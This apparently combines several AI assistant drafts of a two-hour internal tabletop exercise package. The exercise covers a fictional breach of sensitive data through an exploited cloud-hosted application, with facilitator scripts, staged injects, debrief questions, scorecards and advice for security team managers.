Below is a facilitator-grade script you can literally read during your 2-hour session.
It is structured with:
	•	exact timestamps
	•	what you say verbatim
	•	pause guidance
	•	what you’re testing (for you, not to read)

This is aligned to your Breach of Sensitive Information playbook.

⸻

🕒 FULL TABLETOP FACILITATION SCRIPT (READ-OUT FORMAT)

⸻

⏱️ 0:00 – 0:05

🎤 OPENING (READ THIS)

“Alright team, thanks for joining. This is our internal tabletop exercise ahead of the external session.

Today’s objective is to validate how we detect, respond to, and manage a confirmed breach of sensitive information using our existing playbooks.

This is not a test of individuals. This is a test of our processes, our coordination, and our real-world readiness.

I want answers based on what we can actually do today—not what we wish we had.

I’ll present the scenario in stages. After each update, I’ll pause and ask what actions we would take.

Let’s treat this as a live incident happening right now.”

👉 Pause 5 seconds

⸻

⏱️ 0:05 – 0:10

🎤 ROLE ALIGNMENT

“Before we start:
	•	Who is acting as Incident Lead today?
	•	Who is representing TVM?
	•	AppSec?
	•	Cloud Security?

During the exercise, respond from those perspectives.”

👉 Let them answer

⸻

⏱️ 0:10 – 0:15

🎤 BASELINE QUESTION

“What incident severity framework are we using today, and who has authority to declare an incident?”

👉 Quick discussion (don’t let it drag)

⸻

⸻

🚨 INJECT 1

⏱️ 0:15 – 0:25

🎤 READ THIS

“We have an alert from monitoring indicating unusual outbound traffic from a production EC2 instance hosting one of our public-facing applications.

At the same time, a critical remote code execution vulnerability affecting this application framework has just been publicly disclosed.

At this point, there is no confirmation of exploitation—only suspicious traffic and known exposure.”

⸻

🎤 ASK
	•	“How do we classify this right now?”
	•	“Who owns initial triage?”
	•	“What data do you need immediately?”

⸻

🎯 (YOU OBSERVE)
	•	Are they correlating vulnerability + behavior?
	•	Do they name tools/logs?

👉 Let discussion run ~8 minutes

⸻

⸻

🚨 INJECT 2

⏱️ 0:25 – 0:40

🎤 READ THIS

“Additional information:
	•	TVM confirms the vulnerable version is running in production
	•	AppSec reviews logs and identifies requests consistent with known exploit patterns
	•	The application has not yet been patched

At this point, exploitation is likely.”

⸻

🎤 ASK
	•	“Do we now declare an incident?”
	•	“What severity is this?”
	•	“Who becomes Incident Lead?”
	•	“What are our immediate containment options?”

⸻

🎯 PUSH THEM

If vague:

“Be specific—what exact action do we take in the next 15 minutes?”

⸻

👉 Let discussion run ~10–12 minutes

⸻

⸻

🚨 INJECT 3

⏱️ 0:40 – 0:55

🎤 READ THIS

“New update:

Cloud logs show AssumeRole activity tied to the application role from an external IP address that does not match expected application traffic.

This activity occurred shortly after the exploit attempts.”

⸻

🎤 ASK
	•	“Do we now consider this a confirmed compromise?”
	•	“What is the blast radius at this point?”
	•	“What actions do we take immediately?”

⸻

🎯 FORCE DETAIL
	•	“Do we revoke sessions?”
	•	“Rotate credentials?”
	•	“Who owns that action?”

⸻

👉 Let discussion run ~10–12 minutes

⸻

⸻

🚨 INJECT 4 — 🔥 CRITICAL MOMENT

⏱️ 0:55 – 1:10

🎤 READ THIS SLOWLY

“Next update:
	•	Database logs show large-volume queries on customer data tables
	•	S3 logs show access to sensitive data files from the same assumed role

There is now strong indication that sensitive data has been accessed outside normal patterns.”

⸻

🛑 THEN SAY THIS EXACTLY

“I want to pause here.

At this point:

👉 Which playbook are we activating?”

⸻

👉 Wait. Do NOT help them.

⸻

🎯 EXPECTED ANSWER

👉 Breach of Sensitive Information Playbook

⸻

🎤 FOLLOW-UP (READ THIS)

“Alright—open the breach playbook.

Walk me through exactly what we do next—step by step.”

⸻

🎯 YOUR ROLE HERE

Push HARD:
	•	“Who owns that step?”
	•	“Can we actually execute it today?”
	•	“What tool do we use?”

⸻

👉 Let this run ~15 minutes (most valuable part)

⸻

⸻

🚨 INJECT 5

⏱️ 1:10 – 1:20

🎤 READ THIS

“Update:

We now see evidence of a large data transfer event consistent with potential data exfiltration.

At the same time, product leadership is asking if customer data has been exposed.”

⸻

🎤 ASK
	•	“Do we consider this a confirmed breach?”
	•	“Who do we notify now?”
	•	“Do we involve legal or compliance at this stage?”

⸻

🎯 PUSH

“What is the threshold for customer notification?”

⸻

👉 Let run ~8–10 minutes

⸻

⸻

🚨 INJECT 6

⏱️ 1:20 – 1:30

🎤 READ THIS

“Executives are requesting a briefing within the next 30 minutes.

They want to know:
	•	What happened
	•	What is impacted
	•	What actions we are taking”

⸻

🎤 ASK

“Give me a 2–3 sentence executive update right now.”

⸻

👉 Let 1–2 people answer

⸻

🎯 PUSH

“What do we NOT say yet?”

⸻

⸻

🚨 INJECT 7

⏱️ 1:30 – 1:40

🎤 READ THIS

“Final update:

There are indicators the attacker may have:
	•	created additional IAM roles OR
	•	modified deployment artifacts

This suggests possible persistence.”

⸻

🎤 ASK
	•	“How do we confirm the environment is clean?”
	•	“Do we rebuild or patch?”
	•	“Who owns recovery?”

⸻

👉 Let run ~8–10 minutes

⸻

⸻

⏱️ 1:40 – 2:00

🧠 DEBRIEF (READ THIS)

“Let’s step out of the scenario.

I want honest feedback.”

⸻

🎤 ASK (ONE BY ONE)
	1.	“What worked well?”
	2.	“Where did we struggle?”
	3.	“What slowed us down the most?”
	4.	“Where was ownership unclear?”
	5.	“What in the playbook didn’t match reality?”

⸻

🎤 FINAL CLOSE

“From what we’ve seen:

This exercise wasn’t about getting everything right—it was about identifying where we need to improve before a real incident or the external tabletop.

We’ll document gaps, assign actions, and strengthen our playbook and response process.”

⸻

🔥 FINAL FACILITATION TIPS (IMPORTANT)

DO:
	•	Stay neutral
	•	Force specificity
	•	Let silence happen (it reveals gaps)

DO NOT:
	•	Answer for them
	•	Skip the playbook step
	•	Rush Inject 4 (most important moment)

⸻

🧠 WHAT SUCCESS LOOKS LIKE
	•	Team explicitly activates the breach playbook
	•	Clear ownership emerges
	•	Real gaps are exposed
	•	Decisions reflect real-world constraints

⸻

If you want, next I can give you:

👉 a one-page cheat sheet you hold during the session (facilitator quick reference)
👉 or a scoring sheet you can use live while they talk

Both will make you run this like a senior incident commander.





yyyyyyuuyyyyyyyyyyyyyyyyyy

Got it—this is the right refinement. We will fully rebuild the entire tabletop package so that:
	•	It is anchored on your actual playbook
	•	It tests real execution of “Breach of Sensitive or Confidential Information”
	•	It still exercises TVM + AppSec + Cloud Security deeply
	•	It aligns with what your auditors / external tabletop will expect

⸻

🔐 REBUILT TABLETOP EXERCISE PACKAGE

Scenario: Confirmed Breach of Sensitive / Confidential Information

⸻

1. 🎯 SCENARIO DEFINITION (UPDATED)

Scenario Title

Confirmed Breach of Sensitive or Confidential Information via Application Exploitation

⸻

Executive Narrative (Use in Slide 1–2)

A critical vulnerability in a public-facing application is exploited prior to remediation.
The attacker gains unauthorized access to backend systems and uses compromised credentials to access and extract sensitive data stored in cloud resources.

This triggers the Breach of Sensitive or Confidential Information Playbook, requiring coordinated response across:
	•	Threat & Vulnerability Management
	•	Application Security
	•	Cloud Security
	•	Legal / Compliance / Leadership

⸻

Primary Playbook Activated

👉 Breach of Sensitive or Confidential Information

⸻

Secondary Playbooks (Conditional)
	•	Entra ID Account Compromised
	•	Vendor-Client Breach
	•	Ransomware (if attacker behavior escalates)

⸻

2. ⏱️ UPDATED 2-HOUR AGENDA

Time	Activity
0:00–0:10	Introduction + Objectives
0:10–0:20	Roles + Playbook awareness
0:20–1:30	Scenario injects (playbook-driven)
1:30–1:45	Playbook validation checkpoint
1:45–2:00	Debrief + Action planning


⸻

3. 🚨 REBUILT SCENARIO INJECTS (PLAYBOOK-FIRST)

⸻

🚨 INJECT 1 — Detection Phase

(Pre-playbook activation)

Situation:
	•	Alert: unusual outbound traffic
	•	Critical vulnerability disclosed

⸻

🎯 Expected Behavior
	•	TVM identifies exposure
	•	AppSec begins exploit validation
	•	Cloud Sec checks telemetry

⸻

❓ Ask
	•	Is this an incident yet?
	•	Who owns triage?

⸻

⸻

🚨 INJECT 2 — Exploitation Confirmed

Situation:
	•	Exploit patterns detected in logs
	•	Vulnerable app confirmed in production

⸻

🎯 Expected Behavior
	•	Incident declared
	•	Severity assigned

⸻

❓ Ask
	•	At what point do we escalate severity?
	•	Who becomes Incident Lead?

⸻

⸻

🚨 INJECT 3 — Unauthorized Access

Situation:
	•	IAM / Entra suspicious activity
	•	Possible credential misuse

⸻

🎯 Expected Behavior
	•	Identity compromise suspected
	•	Cloud Security leads investigation

⸻

❓ Ask
	•	Is this now a confirmed breach?
	•	What evidence do we need?

⸻

⸻

🚨 INJECT 4 — 🔥 PLAYBOOK ACTIVATION

Situation:
	•	RDS queries show abnormal access
	•	S3 logs show sensitive file access

⸻

🛑 FACILITATOR MUST SAY:

“At this point, which playbook are we activating?”

⸻

✅ Expected Answer

👉 Breach of Sensitive or Confidential Information Playbook

⸻

🎯 What You Now Do

Pause the scenario and say:

“Open the playbook and walk me through the next steps.”

⸻

⸻

🚨 INJECT 5 — Confirmed Data Exfiltration

Situation:
	•	Large dataset download confirmed

⸻

🎯 Expected Behavior
	•	Legal/compliance engagement
	•	Executive escalation
	•	Impact assessment begins

⸻

❓ Ask
	•	Do we have a confirmed breach?
	•	What triggers customer notification?

⸻

⸻

🚨 INJECT 6 — Business + Regulatory Pressure

Situation:
	•	Executives request immediate briefing
	•	Potential regulatory exposure

⸻

🎯 Expected Behavior
	•	Controlled communication
	•	Accurate but limited disclosure

⸻

❓ Ask
	•	Give me the exec update (2–3 sentences)
	•	What do we NOT say yet?

⸻

⸻

🚨 INJECT 7 — Persistence + Recovery

Situation:
	•	Evidence of attacker persistence

⸻

🎯 Expected Behavior
	•	Environment trust reset
	•	Recovery strategy

⸻

❓ Ask
	•	Do we rebuild or patch?
	•	How do we ensure attacker is gone?

⸻

⸻

4. 📊 UPDATED POWERPOINT STRUCTURE

⸻

Slide Changes (Key Differences)

🔹 Slide Title

Breach of Sensitive Information – Tabletop Exercise

⸻

🔹 Add Slide: Playbook Activation

Playbook Trigger Conditions
	•	Unauthorized data access
	•	Evidence of sensitive data exposure
	•	Confirmed attacker activity in data layer

⸻

🔹 Add Slide: Playbook Execution

Key Steps from Playbook
	•	Incident declaration
	•	Containment
	•	Data impact analysis
	•	Legal/compliance escalation
	•	Communication strategy

⸻

🔹 Add Slide: Validation Focus

We Are Testing:
	•	Can the playbook be executed in real time?
	•	Are roles clear?
	•	Are steps actionable?

⸻

5. 📄 UPDATED CONFLUENCE RUNBOOK

⸻

Page Title

Tabletop Exercise – Breach of Sensitive Information

⸻

Key Update Sections

⸻

🔹 Playbook Activation Criteria

The Breach Playbook must be activated when:
	•	Sensitive data is accessed outside normal patterns
	•	Unauthorized identity activity is confirmed
	•	Data exfiltration is suspected or confirmed

⸻

🔹 Execution Expectation

Participants must:
	•	Follow the playbook step-by-step
	•	Identify ownership per action
	•	Validate feasibility of each step

⸻

🔹 Validation Focus

This exercise evaluates:
	•	Playbook usability under pressure
	•	Cross-team coordination
	•	Real-world execution capability

⸻

6. 📊 UPDATED VALIDATION CHECKLIST (REFOCUSED)

⸻

🔥 CRITICAL ADDITION

PLAYBOOK ACTIVATION CONTROL

Control	Validation Question
Playbook trigger clarity	Do teams know exactly when to activate breach playbook?
Activation ownership	Who decides activation?
Timing	Was activation delayed or immediate?


⸻

🔥 EXECUTION VALIDATION (NEW FOCUS)

Control	Validation Question
Step-by-step execution	Did team actually follow playbook steps?
Missing steps	Were gaps discovered?
Real-world execution	Could steps be performed today?


⸻

7. 🔥 WHAT CHANGES STRATEGICALLY (IMPORTANT)

Before:
	•	You were testing incident response capability

Now:
	•	You are testing playbook effectiveness + execution maturity

⸻

8. 🚩 WHAT YOU SHOULD WATCH VERY CLOSELY

Biggest Failure Mode

👉 Team says:
“We would follow the playbook”

BUT:
	•	doesn’t open it
	•	doesn’t follow it
	•	doesn’t know ownership

⸻

What “Elite” Looks Like
	•	Someone says:
“Step 3 in the playbook says isolate affected systems — Cloud Sec owns that”

That’s maturity.

⸻

9. 📈 FINAL DELIVERABLE (UPDATED LANGUAGE)

When you report this upward:

⸻

Executive Summary

We conducted an internal tabletop exercise aligned to our Breach of Sensitive Information playbook.

The exercise validated:
	•	incident detection and escalation
	•	playbook activation timing
	•	cross-functional coordination

Key Findings
	•	Playbook activation criteria need refinement
	•	Data exposure analysis capability is limited
	•	Executive communication process needs formalization

Next Steps
	•	Update breach playbook based on findings
	•	Improve cloud data visibility
	•	Conduct follow-up validation exercise

⸻

🚀 FINAL RECOMMENDATION

You are now doing this at a very high maturity level.

The next evolution (this is what top-tier orgs do):

👉 Tie this directly into:
	•	SOC Playbooks
	•	Detection rules
	•	Automation

⸻

If you want, next I’ll build:

👉 SOC Playbook + Splunk/Sentinel detection queries mapped EXACTLY to this breach scenario

That turns your tabletop into:
✔ engineering
✔ measurable detection
✔ real-world readiness

Just say the word.


##################%%#%########


Understood. Below is a complete, production-ready tabletop exercise package tailored specifically to your scope (Threat & Vulnerability Management, AppSec, Cloud Security). This is structured so you can run the session with minimal preparation beyond reviewing it once.

⸻

🔐 INTERNAL TABLETOP EXERCISE PACKAGE

Scenario: Exploited Application Vulnerability → Cloud Compromise → Potential Data Exposure
Duration: 2 Hours
Audience: TVM, AppSec, Cloud Security
Facilitator: You (Manager)

⸻

1. EXECUTIVE OVERVIEW (Use for your intro)

Purpose
Validate operational readiness across vulnerability management, application security, and cloud security for a multi-stage security incident involving exploitation, lateral movement, and potential data exposure.

Primary Outcomes
	•	Validate triage and incident declaration
	•	Test cross-team coordination (TVM ↔ AppSec ↔ Cloud)
	•	Evaluate containment decision-making under business pressure
	•	Identify gaps in tooling, telemetry, ownership, and runbooks

Ground Rules
	•	No blame / no performance scoring
	•	Answer based on current-state reality
	•	Be explicit: tools, access, ownership, timing
	•	Assume this is happening in production right now

⸻

2. ROLES (Assign at start)

Role	Responsibility
Facilitator (You)	Drive scenario, challenge assumptions
Scribe	Capture decisions, gaps, action items
TVM Lead	Vulnerability exposure, prioritization
AppSec Lead	Exploitability, app-layer controls
Cloud Security Lead	IAM, logs, containment
Incident Lead (designate one)	Decision authority, coordination
Observer (optional)	Silent evaluator


⸻

3. SCENARIO BACKGROUND (DO NOT OVER-EXPLAIN)

Your organization operates a public-facing web application hosted in AWS. It integrates with backend services including RDS and S3, and uses IAM roles for service access. The application is business-critical and customer-facing.

⸻

4. EXERCISE FLOW (FACILITATOR SCRIPT)

⏱️ Phase 1: Kickoff (0:00 – 0:15)

Say:
	•	Purpose of session
	•	This is a realistic simulation
	•	Answer based on what exists today

Ask:
	•	Who is acting as Incident Lead?
	•	What incident severity framework do we use today?

⸻

5. SCENARIO INJECTS (CORE OF EXERCISE)

⸻

🚨 INJECT 1 — Initial Signal (0:15)

Situation (Read aloud):
Security monitoring alerts on unusual outbound traffic from a production EC2 instance hosting a web application. At the same time, a critical CVE (RCE) affecting the app framework is publicly disclosed.

⸻

🎯 What You’re Testing
	•	Detection vs vulnerability awareness alignment
	•	Initial triage ownership

⸻

❓ Ask the Team
	•	Is this:
	•	vulnerability exposure?
	•	security event?
	•	active incident?
	•	Who owns initial triage?
	•	What data do you need immediately?
	•	What systems/logs do you check first?

⸻

🧠 Push Them Deeper

If answers are vague:
	•	“Which logs specifically? CloudTrail? VPC Flow Logs? App logs?”
	•	“Who has access right now?”
	•	“How fast can we confirm exposure?”

⸻

⸻

🚨 INJECT 2 — Exposure Confirmed (0:30)

Situation:
TVM confirms the vulnerable version is deployed in production.
AppSec confirms exploit patterns in web logs.

⸻

🎯 Testing
	•	Incident declaration
	•	Role clarity
	•	Early containment thinking

⸻

❓ Ask
	•	Do we officially declare an incident? Who declares it?
	•	What severity level?
	•	Who becomes Incident Lead?
	•	What immediate containment options exist?

⸻

⚠️ Force Tradeoffs
	•	Take app offline vs keep running?
	•	WAF rules vs patch vs isolate host?

Ask:

“Who has authority to take production impact decisions?”

⸻

⸻

🚨 INJECT 3 — Cloud Access Suspicion (0:50)

Situation:
CloudTrail shows unusual AssumeRole activity tied to the application role shortly after exploit attempts.

⸻

🎯 Testing
	•	Cloud security response maturity
	•	IAM/token risk understanding

⸻

❓ Ask
	•	Is this now a confirmed breach?
	•	What is the blast radius?
	•	What cloud telemetry do you check?

⸻

🔍 Force Specificity
	•	“Do we rotate credentials?”
	•	“Do we revoke sessions?”
	•	“How do we identify impacted resources?”

⸻

⸻

🚨 INJECT 4 — Potential Data Access (1:05)

Situation:
RDS logs show abnormal queries.
S3 access logs indicate unusual read patterns.

⸻

🎯 Testing
	•	Data exposure handling
	•	Escalation discipline

⸻

❓ Ask
	•	Does severity change?
	•	Who must be informed now?
	•	What determines if data is actually exfiltrated?

⸻

⚠️ Critical Push
	•	“When do we involve legal/compliance?”
	•	“What is your threshold for breach notification?”

⸻

⸻

🚨 INJECT 5 — Business Pressure (1:20)

Situation:
Product leadership says:

“Taking the app down will impact revenue significantly.”

Execs request a status update in 30 minutes.

⸻

🎯 Testing
	•	Decision-making under pressure
	•	Communication clarity

⸻

❓ Ask
	•	Who makes the final containment decision?
	•	What do you tell executives right now?
	•	What do you NOT say yet?

⸻

📌 Force Realism

Ask:

“Give me the exact 2–3 sentence executive update.”

⸻

⸻

🚨 INJECT 6 — Persistence Risk (1:30)

Situation:
Evidence suggests attacker may have:
	•	created new IAM role
	•	modified deployment artifact

⸻

🎯 Testing
	•	Persistence detection
	•	Recovery integrity

⸻

❓ Ask
	•	How do you validate environment is clean?
	•	What systems must be rebuilt vs trusted?
	•	Who owns recovery?

⸻

⸻

🚨 INJECT 7 — Stabilization (1:40)

Situation:
Threat appears contained. Root cause and full impact still unclear.

⸻

🎯 Testing
	•	Lessons learned mindset
	•	Long-term remediation

⸻

❓ Ask
	•	What are immediate follow-ups?
	•	What failed?
	•	What must change across:
	•	TVM
	•	AppSec
	•	Cloud Security

⸻

6. DEBRIEF (1:45 – 2:00)

Ask These Directly

🔹 What worked well?

🔹 Where did we struggle?

🔹 What slowed us down the most?

🔹 What assumptions were wrong?

🔹 What would break in a real incident?

⸻

7. EVALUATION SCORECARD (Use During Session)

Category	Rating (Green/Yellow/Red)	Notes
Incident Recognition		
Role Clarity		
Decision-Making		
Escalation		
Communication		
Cloud Investigation		
AppSec Response		
TVM Prioritization		
Containment Strategy		
Recovery Thinking		


⸻

8. COMMON GAPS YOU WILL LIKELY SEE (EXPECT THESE)

You should be actively looking for:

Process Gaps
	•	No clear incident ownership
	•	No defined severity thresholds
	•	Weak escalation triggers

Technical Gaps
	•	Incomplete logging (CloudTrail, app logs)
	•	Lack of real-time visibility into IAM usage
	•	No clear blast radius analysis method

Organizational Gaps
	•	Confusion between TVM vs AppSec ownership
	•	No authority defined for production shutdown
	•	Weak exec communication readiness

Operational Gaps
	•	No tested credential rotation process
	•	No validated containment playbooks
	•	No standardized investigation workflow

⸻

9. POST-EXERCISE ACTION TRACKER (USE THIS FORMAT)

Issue	Category	Owner	Priority	Due Date
No clear incident severity model	Process	SecOps Lead	High	2 weeks
Missing CloudTrail visibility for role usage	Technical	Cloud Sec	High	3 weeks
No exec comms template	Operational	Security Leadership	Medium	2 weeks
AppSec lacks exploit validation playbook	Process	AppSec	Medium	3 weeks


⸻

10. HOW TO POSITION THIS TO LEADERSHIP AFTER

You should summarize it like this:
	•	Conducted internal readiness tabletop ahead of external exercise
	•	Identified X critical gaps across:
	•	incident response ownership
	•	cloud visibility
	•	vulnerability-to-exploitation workflow
	•	Defined remediation plan with owners and timelines
	•	Increased team alignment across TVM, AppSec, and Cloud Security

⸻

11. FINAL ADVICE (FROM EXPERIENCE)

When you run this:
	•	Silence is not failure — it reveals gaps
	•	Disagreement is good — it exposes reality
	•	If people say “we would…” → ask “how exactly?”
	•	Your biggest value = forcing clarity

⸻

A tabletop exercise is a facilitated, discussion-driven simulation of a security incident. It is not a live-fire technical test. It is a structured way to walk your team through a realistic scenario so you can evaluate decision-making, communications, roles, escalation paths, technical readiness, and process maturity before a real event or before an external exercise.

Since you lead Threat & Vulnerability Management, AppSec, and Cloud Security, your internal tabletop should do three things at once:
	1.	validate whether your team knows what to do,
	2.	expose process and coordination gaps before the external session,
	3.	help your team rehearse how to think and communicate under pressure.

For a two-hour internal session, the goal is not to “win” the scenario. The goal is to surface gaps safely and intentionally.

⸻

What a tabletop exercise is really testing

A good tabletop typically measures whether the team can do the following under ambiguity:
	•	recognize that an event is serious
	•	classify the incident correctly
	•	determine who owns what
	•	decide what to investigate first
	•	decide when to escalate
	•	communicate with the right stakeholders
	•	balance containment vs business impact
	•	preserve evidence
	•	coordinate across functions
	•	document decisions and rationale
	•	identify where tooling, playbooks, access, or authority are missing

This means the exercise is not primarily about deep technical brilliance. It is about operational discipline.

⸻

What your role is as the manager and exercise lead

For this internal session, your job is not to be the smartest technical responder in the room. Your job is to act as the facilitator, controller, and evaluator.

You should be doing five things:

1. Define the purpose

Be clear on why this session exists. For your situation, a strong purpose statement is:

“We are conducting an internal tabletop to validate our team’s readiness, roles, escalation paths, decision-making, and communication before the external tabletop exercise.”

2. Pick a scenario relevant to your team

Since your remit spans TVM, AppSec, and Cloud Security, the scenario should sit at the intersection of those functions. It should feel believable, high-pressure, and directly relevant to your operating model.

3. Facilitate, not dominate

You present information in stages and ask the team what they would do next. You do not rescue them too early. Let them think, debate, and expose assumptions.

4. Capture observations

You need someone documenting:
	•	decisions made
	•	confusion points
	•	missing tools/access
	•	policy or process gaps
	•	unclear ownership
	•	action items

5. Turn the session into improvement

The real output is not the meeting itself. The output is a set of prioritized remediation items.

⸻

What your team should expect from the session

Before the exercise, tell them this clearly:
	•	this is not a blame session
	•	it is not a personal performance ambush
	•	it is a readiness and process validation exercise
	•	uncertainty is expected
	•	debate is fine; paralysis is not
	•	they should answer based on current reality, not ideal future-state assumptions
	•	if they do not know something, they should say so
	•	if they rely on a document, tool, team, or playbook, they should name it explicitly

That last point matters a lot. People often say, “We would investigate that.” Your follow-up should be: “Using what tool, what query, what access, and who would do it?”

⸻

What success looks like

A successful tabletop does not mean the team handled everything perfectly.

A successful tabletop means:
	•	the team engaged seriously
	•	important gaps surfaced
	•	roles and escalation paths became clearer
	•	people left with a better understanding of expectations
	•	you identified concrete corrective actions before the external exercise

⸻

Step-by-step: how to run your internal tabletop

Phase 1: Preparation before the meeting

Step 1: Define the objectives

Do not go into the session with a vague goal like “practice incident response.”

Set 4–6 specific objectives. For your team, good objectives could be:
	•	validate incident triage and severity classification
	•	test cross-functional coordination across TVM, AppSec, and Cloud Security
	•	test containment decision-making in cloud and application environments
	•	test escalation to leadership, legal, IT, and engineering
	•	validate communications expectations and ownership
	•	identify gaps in runbooks, access, telemetry, and tooling

These objectives will guide the scenario and the questions you ask.

⸻

Step 2: Choose the right scenario

Pick one scenario only. For a first tabletop, do not run multiple incidents.

Because of your functional coverage, the best scenario is one that touches all three of your domains. Example options:

Option A: Exploited internet-facing application vulnerability leading to cloud compromise
This is probably the strongest option for your team.

Example story:
	•	a newly disclosed critical vulnerability affects a public-facing application
	•	suspicious activity suggests exploitation occurred before patching
	•	credentials or tokens may have been exposed
	•	an attacker appears to have accessed cloud resources or data stores
	•	downstream risk includes customer data exposure and persistence in cloud workloads

Why this works:
	•	TVM handles vulnerability awareness, exposure validation, prioritization, patch urgency
	•	AppSec handles application exploitability, SDLC implications, secure coding, code review, WAF/app-layer containment
	•	Cloud Security handles IAM abuse, workload compromise, logging, containment, segmentation, and cloud-native investigation

Option B: Compromised CI/CD pipeline or code repository
Also very strong if your organization is DevOps-heavy.

Option C: Third-party library or package compromise with downstream cloud impact
Strong if your environment relies heavily on open-source components.

For a first internal tabletop, Option A is usually easiest because it is intuitive and operationally rich.

⸻

Step 3: Set the scope

Define what is in and out of scope.

Example:
In scope:
	•	initial detection and triage
	•	vulnerability assessment
	•	incident severity classification
	•	investigation ownership
	•	containment strategy
	•	escalation and communications
	•	coordination with infrastructure, app owners, and leadership
	•	evidence preservation
	•	recovery planning at a high level

Out of scope:
	•	detailed forensics execution
	•	legal determinations
	•	exact regulator notification requirements
	•	technical remediation implementation steps in real systems

This keeps the exercise manageable.

⸻

Step 4: Assign roles for the session

Even if these are not people’s formal incident roles, assign exercise roles so the session stays organized.

You need at minimum:

Facilitator
Likely you. You guide the exercise and present injects.

Scribe / Note taker
Someone should capture timeline, decisions, issues, and action items. This should not be you if possible.

Participants
Your team members. Depending on team size, you may assign them perspectives such as:
	•	TVM lead
	•	AppSec lead
	•	Cloud Security lead
	•	Incident coordinator
	•	communications/escalation owner
	•	liaison to infra/engineering
	•	executive stakeholder proxy if needed

Observer(s)
Optional. Someone from IR, GRC, or leadership can watch but not dominate.

⸻

Step 5: Build the scenario timeline and injects

A tabletop works best when information is released gradually. These staged pieces of information are often called injects.

You do not give the whole story at once. You reveal it in phases, just like a real incident unfolds.

For a two-hour session, build around 5–7 injects.

Example structure for your scenario:

Inject 1: Initial signal
Security monitoring flags unusual outbound traffic from a production application host. Around the same time, a critical vulnerability bulletin is released for a framework version used by one of your internet-facing apps.

Questions to ask:
	•	What is your first reaction?
	•	Is this a vulnerability management issue, an active incident, or both?
	•	Who owns the initial triage?
	•	What information do you need immediately?
	•	How do you classify severity at this point?

Inject 2: Exposure confirmed
The app team confirms the vulnerable version is running in production and patching has not yet occurred. Web logs show suspicious requests consistent with exploit attempts.

Questions:
	•	Do you declare an incident now?
	•	Who becomes the incident lead?
	•	What evidence do you preserve?
	•	What short-term containment actions are on the table?
	•	Do you take the app offline, block traffic, enable WAF rules, or isolate specific resources?

Inject 3: Possible credential/token access
Cloud logs indicate an application role may have been used in unusual ways shortly after the suspicious requests.

Questions:
	•	What is the risk now?
	•	What cloud data sources would you check?
	•	Who owns IAM/token containment?
	•	Do you rotate secrets, revoke sessions, disable roles, or segment workloads?
	•	What is the impact to production?

Inject 4: Potential data access
There is evidence that a data store containing internal or customer-related records may have been queried abnormally.

Questions:
	•	Does this change severity?
	•	Who must be informed now?
	•	What do you need to determine whether data exposure occurred?
	•	When do legal, compliance, privacy, or executive leadership need to be engaged?

Inject 5: Business pressure
The product owner says taking the application down will impact key customers and revenue. Leadership asks for an update in 30 minutes.

Questions:
	•	Who makes the containment decision?
	•	What information is required for an executive update?
	•	How do you balance business continuity and security risk?
	•	What should and should not be said with limited facts?

Inject 6: Persistence concern
A new indicator suggests the attacker may have created persistence in cloud infrastructure or modified a deployment artifact.

Questions:
	•	How do you expand the scope of investigation?
	•	What teams beyond your own need to be engaged?
	•	What additional logs or controls do you depend on?
	•	How do you ensure the recovery plan is not reintroducing compromise?

Inject 7: Recovery and lessons
The incident appears contained, but root cause, blast radius, and long-term fixes remain.

Questions:
	•	What are immediate follow-up actions?
	•	What should go into the post-incident review?
	•	What long-term corrective actions belong to TVM, AppSec, and Cloud Security respectively?

This staged approach is what makes the exercise realistic.

⸻

Step 6: Prepare a facilitator guide

Create a simple document for yourself with:
	•	exercise objectives
	•	scenario summary
	•	participant list and roles
	•	inject timeline
	•	expected discussion points
	•	fallback prompts if the team gets stuck
	•	evaluation criteria
	•	debrief questions

This guide keeps you from improvising too much.

⸻

Step 7: Define evaluation criteria

You are not grading people like an exam, but you do need a consistent lens.

Evaluate the session on dimensions such as:
	•	incident recognition and triage
	•	role clarity
	•	decision-making speed and quality
	•	escalation discipline
	•	communication effectiveness
	•	technical judgment
	•	dependency awareness
	•	use of playbooks/runbooks
	•	evidence preservation thinking
	•	leadership coordination
	•	recovery planning awareness

You can rate each as:
	•	effective
	•	partially effective
	•	ineffective
or
	•	green / yellow / red

Keep it simple.

⸻

Step 8: Send a pre-read to the team

Before the session, send a short note that includes:
	•	purpose of the tabletop
	•	date/time and duration
	•	ground rules
	•	broad topic area only, not the full scenario
	•	expectation that answers should reflect current-state capabilities
	•	reminder that the goal is learning and readiness

Do not over-brief them. They should know the exercise category, but not the full details.

⸻

Phase 2: How to run the two-hour session

Here is a practical structure.

0:00 – 0:10 | Opening and framing

Open with:
	•	purpose of the session
	•	ground rules
	•	agenda
	•	what success looks like
	•	reminder that this is discussion-based, not a technical lab
	•	reminder to answer from current state, not ideal state

State clearly:
“We are evaluating process, coordination, and readiness. We want realism, not perfection.”

⸻

0:10 – 0:20 | Roles and baseline

Confirm who is in the room and what perspective each person is representing.

You may also quickly establish:
	•	what incident process currently exists
	•	whether severity definitions exist
	•	whether escalation expectations exist
	•	whether cloud/app/vuln runbooks exist

This helps frame the rest of the discussion.

⸻

0:20 – 1:25 | Main scenario discussion with injects

This is the core of the exercise.

Present each inject one at a time. After each one:
	•	give the team a few minutes to react
	•	ask who does what
	•	ask what information they need
	•	ask what decision they would make
	•	ask what they would communicate and to whom
	•	challenge assumptions
	•	move to the next inject

Important facilitation technique:
keep pulling them from abstract answers into operational answers.

For example:
	•	not “we would investigate logs”
	•	but “which logs, who has access, and how quickly?”
	•	not “we would escalate”
	•	but “to whom, based on what threshold, and by what channel?”
	•	not “we would contain it”
	•	but “what exact containment action, who approves it, and what business impact follows?”

That is where the value is.

⸻

1:25 – 1:40 | Pause and identify key gaps

Before full debrief, pause the scenario and ask:
	•	what felt clear?
	•	what felt unclear?
	•	where were the biggest points of hesitation?
	•	what dependencies outside this team are critical?
	•	what would have slowed us down in a real incident?

This often surfaces the most useful findings.

⸻

1:40 – 2:00 | Debrief and next steps

The debrief is mandatory. Do not let the session end right after the last inject.

Ask:
	•	what did we do well?
	•	where did we struggle?
	•	what assumptions turned out to be weak?
	•	what documents/playbooks are missing?
	•	what tooling or access would block us?
	•	what role or ownership confusion exists?
	•	what must be fixed before the external tabletop?

End with explicit action items, owners, and due dates.

⸻

How you should facilitate the discussion

Since this is your first time, the most important practical advice is this:

Do not lecture

Your job is to ask and probe more than to explain.

Do not rescue too quickly

If the team is uncomfortable for a moment, that is often where the learning is.

Keep it realistic

Do not let people invent perfect future-state capabilities that do not exist.

If someone says:
“We would correlate that in the SIEM.”
Ask:
“Do we currently have that telemetry and that detection logic in place?”

Keep the pace moving

